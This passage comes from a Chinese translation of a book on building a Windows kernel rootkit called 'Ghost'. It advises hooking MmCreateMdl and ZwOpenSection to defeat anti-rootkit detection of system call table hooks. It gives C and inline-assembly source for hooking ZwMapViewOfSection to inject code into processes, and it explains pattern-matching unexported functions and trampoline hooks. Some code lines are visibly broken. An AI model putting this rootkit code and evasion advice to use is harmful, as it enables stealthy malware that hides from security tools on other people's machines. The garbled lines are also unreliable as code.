anti-rootkit 软件查看真实的系统调用表（或真实的 ntoskrnl.exe 内容）是唯一被认可的方法。
当然，欺骗系统调用表检测的方法是被推荐的。这是因为 anti-rootkit 软件可能只是基于
Windows 操作系统众多版本中某一个固定版本的 ntoskrnl.exe。如果 anti-rootkit 所调用相应
版本的 ntoskrnl.exe 的文件名改变了，那么挂钩 ZwOpenFile 来查找 ntoskrnl.exe 将找不到它！
为 了 欺 骗 系 统 调 用 表 的 差 检 测 ， 你 需 要 挂 钩 MmCreateMdl 并 查 找 系 统 调 用 表
(KeServiceDescriptorTable.ServiceTableBase)的基地址。你还应该挂钩 ZwOpenSection 并使用
\device\physicalmemory 查找 OBJECT_ATTRIBUTE。如果有进程打开物理内存并写入系统调
用表，那么可以确定你的挂钩将存在被清除的危险。当然也有可能是另外一个 rootkit 在运
行。
总结
我们现在已经拥有了一个具有如下功能的 rootkit：
隐藏自身设备驱动条目
隐藏自身配置文件
挂钩操作系统内核
内核钩子可以提供 rootkit 所需要的大部分函数功能，但是实现一个完整功能的 rootkit
还需要一些其他的技术参与。下章增加另一个 rootkit 中至关重要的部分：进程注入。
笫四章 用户层挂钩
概述
本章将指导你创建一个用户层进程钩子。通过挂钩一个进程中的函数，使得 rootkit 可
以改变这个进程的操作。这样就提供了一个方便的监视，过滤和隐藏等控制机制。
本章包括如下内容：
基本的进程注入
关于 ZwMapViewOfSection
用户层函数声明
跳转挂钩技术
一个基本的进程注入实例
进程注入
当一个 Windows 应用程序被加载到内存时， 应用程序被加载到内存，所有在动态链接
库(DLLs)中定位的必要的外部函数被加载到同一个内存空间。就像应用程序的组成部分一样
这些外部函数被映射到内存。内核函数 ZwMapViewOfSection 来负责映射关系。
一旦 ZwMapViewOfSection 被挂钩，动态链接库函数的映射关系就可以被改变。因为在
加载一个 DLL 时增加每一个函数就必须将其复制到内存来调用进程，替换函数也同样需要
被注入到这个内存空间-这就是所谓的进程注入。图 4-1 所示为 ZwMapViewOfSection。
图 4-1
查找一个特殊的动态链接库
查找一个被 ZwMapViewOfSection 加载的特殊库文件，你需要修改 NewZwMapViewOf
节，并增加一个新的功能函数，IsSameFile。而不是完成全部工程和同时描述所有动作，本
章将增加一些小的代码片段并依次讲解每个代码段。下面是对 hookManager.c 的初始化修改：
BOOL IsSameFile(PUNICODE_STRING shortString, PUNICODE_STRING longString)
{
USHORT index;
USHORT longLen;
USHORT shortLen;
USHORT count;
// Check input
if( !shortString ||
shortString->Length == 0 ||
!longString ||
longString->Length == 0 ||
(shortString->Length > longString->Length))
return FALSE;
index = longString->Length / 2; // wchar_t len is len / 2
// search backwards for backslash
while( --index )
if ( longString->Buffer[index] == L'\\' )
break;
// check for same length first
longLen = (longString->Length / 2) - index - 1;
shortLen = shortString->Length / 2;
if( shortLen != longLen )
return FALSE;
// Compare
count = 0;
while ( count Buffer[++index] != shortString->Buffer[count++] )
return FALSE;
// Match!
return TRUE;
}
IsSameFile 是被用来比较一个全路径名和一个特殊文件名。如果全路径名最后一个反斜
杠后面的文件名和特殊文件名相匹配，那么这个函数返回结果为真。是的，如果不是一个内
核函数，这将更容易实现。同样道理，当工作在内核模式时你将需要写一些你自己的功能函
数。有许多用户模式下的类库和框架可以在程序设计工作中被引用，但是内核等级的支持就
不是那么容易得到的，因此希望大家能够从零开始编写出更多的高效的功能。
NTSTATUS NewZwMapViewOfSection(
IN HANDLE SectionHandle,
IN HANDLE ProcessHandle,
IN OUT PVOID *BaseAddress,
IN ULONG ZeroBits,
IN ULONG CommitSize,
IN OUT PLARGE_INTEGER SectionOffset OPTIONAL,
IN OUT PSIZE_T ViewSize,
IN SECTION_INHERIT InheritDisposition,
IN ULONG AllocationType,
IN ULONG Protect )
{
NTSTATUS status;
// First complete the standard mapping process
status = OldZwMapViewOfSection(SectionHandle,
ProcessHandle,
BaseAddress,
ZeroBits,
CommitSize,
SectionOffset OPTIONAL,
ViewSize,
InheritDisposition,
AllocationType,
Protect );
// Now remap as required ( imageOffset only known for versions 4 & 5 )
if( NT_SUCCESS( status ) && ( majorVersion == 4 || majorVersion == 5 ) )
{
unsigned int imageOffset = 0;
VOID* pSection = NULL;
unsigned int imageSection = FALSE;
HANDLE hRoot = NULL;
PUNICODE_STRING objectName = NULL;
PVOID pImageBase = NULL;
UNICODE_STRING library1 = { 0 };
// Image location higher in version 4
if( majorVersion == 4 )
imageOffset = 24;
if( ObReferenceObjectByHandle( SectionHandle,
SECTION_MAP_EXECUTE,
*MmSectionObjectType,
KernelMode,
&pSection,
NULL ) == STATUS_SUCCESS )
{
// Check to see if this is an image section
// If it is, get the root handle and the object name
_asm
{
mov
edx, pSection
mov
eax, [edx+14h]
add
eax, imageOffset
mov
edx, [eax]
test
byte ptr [edx+20h], 20h
jz
not_image_section
mov
imageSection, TRUE
mov
eax, [edx+24h]
mov
edx, [eax+4]
mov
hRoot, edx
add
eax, 30h
mov
objectName, eax
not_image_section:
}
if( BaseAddress )
pImageBase = *BaseAddress;
// Mapping a DLL
if( imageSection && pImageBase && objectName && objectName->Length > 0 )
{
RtlInitUnicodeString( &library1, L"kernel32.dll" );
if ( IsSameFile( &library1, objectName ) )
DbgPrint( "comint32: NewZwMapViewOfSection found KERNEL32!" );
else
DbgPrint( "comint32: NewZwMapViewOfSection object = %wZ", objectName );
}
}
ObDereferenceObject( pSection );
}
return status;
}
新的 NewZwMapViewOfSection 函数的第一个任务是调用原来的老函数。这是因为涉及
的 DLL 必须在追加的函数被注入前被加载。
在 DLL 被加载后，你必须检测一下比确保成功。除了检测成功之外，还需要做版本检
测。这个检测是唯一不确定的，因为版本检测已经被加到 DriverEntry (如果你想知道我为什
么完成 majorVersion 和 minorVersion 全部)。
版本检测的原因是基于主要版本 4 和 5 的镜像位置不同。一旦镜像定位被确定，检测是
用来确定被映射的节是否是一个实际的镜像。如果被映射的节是一个具有有效基地址和有效
名的镜像，那么进程继续执行。
这里，我们所关心的 DLL 测试可以使用新的功能函数 IsSameFile 来完成。现在，如果
它是目标 DLL 将会输出一个简单的 debug 调试语句。注意可以使用格式化字符串中的%wZ
作为第二个 DbgPrint。这是统一编码字符串的区分符。内核模式 rootkit 开发中统一编码字
符串将广泛使用；知道如何输出他们将会是你的工作得心应手。针对宽位字符和宽位字符串
你可能还会分别使用到%C 和%S。
如果你想完成和安装这个 rootkit，你将会看到每个已启动的应用程序加载的每个 DLL
都会有一个 debug 调试语句，并且当 kernel32.dll 被加载时将看到一个特殊的调试语句。大
多数应用程序都会使用 kernel32.dll，因此找到他们不会很难。
定义一个挂钩函数
在进行挂钩逻辑操作之前，应该 ntddk.h 文件来声明原函数，然后通过剪切、粘贴、修
改 ntddk.h 中的原函数原型来为新挂钩函数创建声明。然而没有一个头文件你将从哪得到函
数原型信息呢？ 很可能你需要挂钩的函数是无正式文档说明的，没有头文件，没有演示调
用目标函数的例程。还有可能你需要挂钩的函数连输出都没有。
这些问题可以用 IDA 来修补。在第一章中我们提到过，IDA 是一个反编译程序，可以
将机器码分解为汇编码。如果你用 IDA 打开一个目标 DLL 文件，你可以选择菜单操作
“Navigate” =>“Jump To”=> “Function”来获得这个 DLL 的输出函数的列表。然后你只要输入
想得到的目标函数名称；IDA 就会高亮显示与你输入字母匹配的函数直到没有与之匹配的。
如果有一个匹配的，找到想要得到的目标函数后按回车键跳转到这个函数。你将看见一些类
似下面显示的信息。我选择使用 ntdll.dll 中的 RtlGUIDFromString 函数来演示这个过程，你
可以使用任意 DLL 中的任意输出函数：
.text:7C926B07
public RtlGUIDFromString
.text:7C926B07 RtlGUIDFromString proc near
.text:7C926B07
.text:7C926B07 var_14
= byte ptr 14h
.text:7C926B07 var_12
= byte ptr 12h
.text:7C926B07 var_10
= byte ptr 10h
.text:7C926B07 var_E
= byte ptr 0Eh
.text:7C926B07 var_C
= byte ptr 0Ch
.text:7C926B07 var_A
= byte ptr 0Ah
.text:7C926B07 var_8
= byte ptr 8
.text:7C926B07 var_6
= byte ptr 6
.text:7C926B07 var_4
= dword ptr -4
.text:7C926B07 arg_4
= dword ptr 8
.text:7C926B07 arg_8
= dword ptr 0Ch
虽然这可能不是你所需要的，但这是一个函数原型。基本上，这个列表显示了
RtlGUIDFromString 函数接受两个传递参数，arg_4 和 arg_8，并且他们都是 32 位指针。仅
供参考，IDA 用 arg_x 来分类传递函数，用 var_x 分类局部堆栈变量。
确定返回结果类型比较麻烦。IDA 显示
.text:7C926B82
retn
8
说明函数返回结果( 在压入参数 arg_4 和 arg_8 后,8 位字节空间必须从堆栈中清空). 然而，
你需要回溯前面代码。
.text:7C926B76
xor
eax, eax
在返回确定确定结果之前，函数有可能返回 NTSTATUS。
使用 IDA 的其他优势是它具有查看函数的实际机器码的能力。当函数没有输出时这个
功能是必要的。下面是整个过程。
在加载了目标 DLL 后，找一个单元挂接，选择 Options=>Text representation,然后从 0 到
8 改变操作码位数。但后按 Enter 来返回到代码界面。你将看到没有输出函数的机器码。随
后，我们可以使用一些这样样式的机器码来挂接无输出函数。
即使 RtlGUIDFromString 被输出，它也可以作为一个如何检索机器码样式的例子。使用
Windows XP SP2 家庭版中的 ntdll.dll，你能看到这样的代码样式：
55 8B EC 83 EC 14 56 8B 75 0C A1 34 C0 97 7C 8D 4D FA 51 8D 4D F8 51...
我们还需要一些汇编语言程序设计的知识来确认什么时候一个机器码样式随着使用开
始变化，但是通常使用一个样式来表示初始偏移和函数入口是比较安全的。真正重要的是
DLL 中唯一的代码样式。这个样式必须足够长以保证在所有版本的目标 DLL 中都是唯一的；
否则，一个样式匹配算法可能挂钩到错误的函数。如果你已经下载了 Microsoft Visual C++
2005 Express，你可以以二进制形式打开一个文件并在一个 DLL 中搜索一个特殊样式。如果
你只找到一个，那么你很幸运！
跳转函数
还需要一个细节，在挂钩前覆盖应用内存。像前面所提到的，DLL 函数被加载到应用
内存并作为内部函数使用。与挂钩系统调用表执行内核钩子不相似，因此嵌入一个钩子到应
用内存还需要一些准备工作。图 4-2 显示这个跳转过程。
可以通过在 Ghost 中使用一个跳转函数的方法来实现 DLL 挂钩。这个跳转函数简单的
执行一个指令并执行一个跳转。跳转函数里的指令是被挂钩函数的第一个指令，跳转则是指
向被挂钩函数的第二个指令。这就排除了对被挂钩函数第一个指令的需要，这就允许放置一
个跳转指向注入函数。这个跳转可以调用注入函数来建立一个挂钩。
在使用一个跳向注入函数指令替换被挂钩函数的第一个指令之后，被注入的函数可以调
用跳转来执行原函数。你所需要记住的唯一的事情就是跳转的位置，被挂钩函数第二条指令
的位置和被嵌入跳转函数的有效指令。因为这些指令所占用的空间大小是已知的，所以这些
空间可以分配到被注入内存。
初始版本的 Ghost 也有一个方法来确定偏移地址（原函数中被替换的跳转）。它允许一
个匹配样式在关键指令之后开始执行，就像检索一个全局变量。因为 ZwMapViewOfSection
在全局变量单元被定位前使用，这个函数，它的第一个指令是加载一个以后不被复制和使用
的全局地址。为了避免这个问题，跳转指令可以被写入到原函数中较远的位置。如果这个跳
转的位置是在函数堆栈调节器后，这时将需要一个新近的堆栈调节器以便被挂钩函数可以到
达原堆栈位置。
一个例子
这个例子将增加 Ghost 工程的体积。体积和复杂性增加的原因源于需要对 PE (Windows
executable)文件的分析，需要提供挂钩函数和挂钩注入代码，并需要精确的识别 x86 指令。
分析机器码来找到一个可以被一个跳转替换的指令看起来已经超出了本书讨论的范围，但是
这是跳转挂钩方法中一个重要的组成部分。
函数功能的实现需要进程注入，我们可以通过创建四个新文件和修改六个现有文件来实
现。
新文件如下：
injectManager.c
injectManager.h
parse86.c
parse86.h
下面是需要修改的文件：
Ghost.c
Ghost.h
hookManager.c
hookManager.h
peFormat.h
SOURCES
下面是源代码。
源代码
将文件 injectManager.c 和 parse86.c 加入到 SOURCES 中：
TARGETNAME=comint32
TARGETPATH=OBJ
TARGETTYPE=DRIVER
SOURCES=Ghost.c\
fileManager.c\
hookManager.c\
injectManager.c\
parse86.c\
configManager.c
Ghost.h
Ghost.h
Ghost.h
Ghost.h
通过扩展文件 Ghost.h 来定义更多的数据类型，当调用 CreateFile 使用一个数据结构。
像 CreateFileW 和 lstrcmpiW 这样的函数被定位于 kernel32.dll 中，并且通过数据交换结构提
供给注入函数，IN_PROCESS_DATA,在 injectManager.h 中定义：
// Copyright Ric Vieler, 2006
// Support header for Ghost.c
#ifndef _GHOST_H_
#define _GHOST_H_
typedef unsigned long DWORD;
typedef int BOOL;
typedef unsigned char BYTE;
typedef unsigned short WORD;
typedef float FLOAT;
typedef FLOAT* PFLOAT;
typedef BOOL* PBOOL;
typedef BYTE* PBYTE;
typedef int* PINT;
typedef WORD* PWORD;
typedef DWORD* PDWORD;
typedef DWORD* LPDWORD;
typedef int INT;
typedef unsigned int UINT;
typedef unsigned int* PUINT;
typedef long* LPLONG;
typedef void* PVOID;
#define LPVOID PVOID
typedef PVOID FARPROC;
typedef const void* LPCVOID;
typedef struct _SECURITY_ATTRIBUTES
{
DWORD nLength;
LPVOID lpSecurityDescriptor;
BOOL bInheritHandle;
} SECURITY_ATTRIBUTES, *PSECURITY_ATTRIBUTES, *LPSECURITY_ATTRIBUTES;
#endif
Ghost.c
Ghost.c
Ghost.c
Ghost.c
通过增加两个全局变量来扩展 Ghost.c 文件：
PVOID kernel32Base = NULL;
ZWPROTECTVIRTUALMEMORY OldZwProtectVirtualMemory;
当被映射的的库在 kernel32.dll 中时，Kernel32Base 由函数 ZwMapViewOfSection 支持。
OldZwProtectVirtualMemory 由 findUnresolved 支持，模式匹配算法是指从 ZwPulseEvent 向
后搜索查找 ZwProtectVirtualMemory。